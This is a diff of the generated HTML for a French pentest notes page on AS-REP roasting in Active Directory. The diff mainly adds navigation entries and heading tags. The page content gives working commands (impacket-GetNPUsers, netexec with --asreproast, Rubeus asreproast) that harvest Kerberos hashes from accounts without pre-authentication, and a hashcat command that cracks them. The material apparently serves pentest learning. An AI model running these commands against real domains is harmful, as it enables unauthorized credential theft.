@@ -5904,6 +5904,30 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Linux">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#enumeration-des-utilisateurs-sur-le-dc-et-des-comptes-asreproastables" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumération des utilisateurs sur le DC et des comptes asreproastables:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#via-netexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      Via netexec:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -5913,6 +5937,21 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Windows">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#enumeration-des-utilisateurs-sur-le-dc-et-des-comptes-asreproastables_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumération des utilisateurs sur le DC et des comptes asreproastables:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -5921,6 +5960,21 @@
       Crack des hash
     </span>
   </a>
+  
+    <nav class="md-nav" aria-label="Crack des hash">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cracker-les-hash-obtenus" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cracker les hash obtenus:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -7921,6 +7975,30 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Linux">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#enumeration-des-utilisateurs-sur-le-dc-et-des-comptes-asreproastables" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumération des utilisateurs sur le DC et des comptes asreproastables:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#via-netexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      Via netexec:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -7930,6 +8008,21 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Windows">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#enumeration-des-utilisateurs-sur-le-dc-et-des-comptes-asreproastables_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumération des utilisateurs sur le DC et des comptes asreproastables:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -7938,6 +8031,21 @@
       Crack des hash
     </span>
   </a>
+  
+    <nav class="md-nav" aria-label="Crack des hash">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cracker-les-hash-obtenus" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cracker les hash obtenus:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -7961,21 +8069,21 @@
 <p>L'attaque AsrepRoasting consiste à cibler les utilisateurs n'ayant pas l'attribut de pré-authentification. Ceci permet alors de récupérer un hash qui peut ensuite être cracké.
 La dangerosité principale de cette technique est le fait qu'il n'est pas nécessaire d'être authentifié pour l'effectuer, le seul élément nécessaire est le nom du compte à cibler (Il est possible d'énumérer les comptes asreproastables directement si l'on est authentifié, cependant).</p>
 <h3 id="linux">Linux</h3>
-<p>Enumération des utilisateurs sur le DC et des comptes asreproastables:</p>
+<h4 id="enumeration-des-utilisateurs-sur-le-dc-et-des-comptes-asreproastables">Enumération des utilisateurs sur le DC et des comptes asreproastables:</h4>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>impacket-GetNPUsers<span class="w"> </span>domain.local/<span class="w"> </span>-userfile<span class="w"> </span>/wordlist/username<span class="w"> </span>-format<span class="w"> </span>hashcat<span class="w"> </span>-outputfile<span class="w"> </span>asreproast.txt
 </span></code></pre></div>
-<p>Via netexec:</p>
+<h4 id="via-netexec">Via netexec:</h4>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>netexec<span class="w"> </span>ldap<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>users.txt<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--asreproast<span class="w"> </span>asreproast.txt
 </span></code></pre></div>
 <p>Si l'on est authentifié nous pouvons avoir accès à la liste des utilisateurs via LDAP, ce qui permet d'identifier les comptes asreproastables sans avoir à bruteforcer une liste d'utilisateur:</p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>netexec<span class="w"> </span>ldap<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span><span class="nv">$user</span><span class="w"> </span>-p<span class="w"> </span><span class="nv">$pass</span><span class="w"> </span>--asreproast<span class="w"> </span>asreproast.txt
 </span></code></pre></div>
 <h3 id="windows">Windows</h3>
-<p>Enumération des utilisateurs sur le DC et des comptes asreproastables:</p>
+<h4 id="enumeration-des-utilisateurs-sur-le-dc-et-des-comptes-asreproastables_1">Enumération des utilisateurs sur le DC et des comptes asreproastables:</h4>
 <div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asreproast</span> <span class="p">/</span><span class="n">format</span><span class="p">:</span><span class="n">hashcat</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">asreproast</span><span class="p">.</span><span class="n">txt</span>
 </span></code></pre></div>
 <h3 id="crack-des-hash">Crack des hash</h3>
-<p>Cracker les hash obtenus:</p>
+<h4 id="cracker-les-hash-obtenus">Cracker les hash obtenus:</h4>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>hashcat<span class="w"> </span>asreproast.txt<span class="w"> </span>/usr/share/wordlists/rockyou.tar.gz
 </span></code></pre></div>
 <hr />
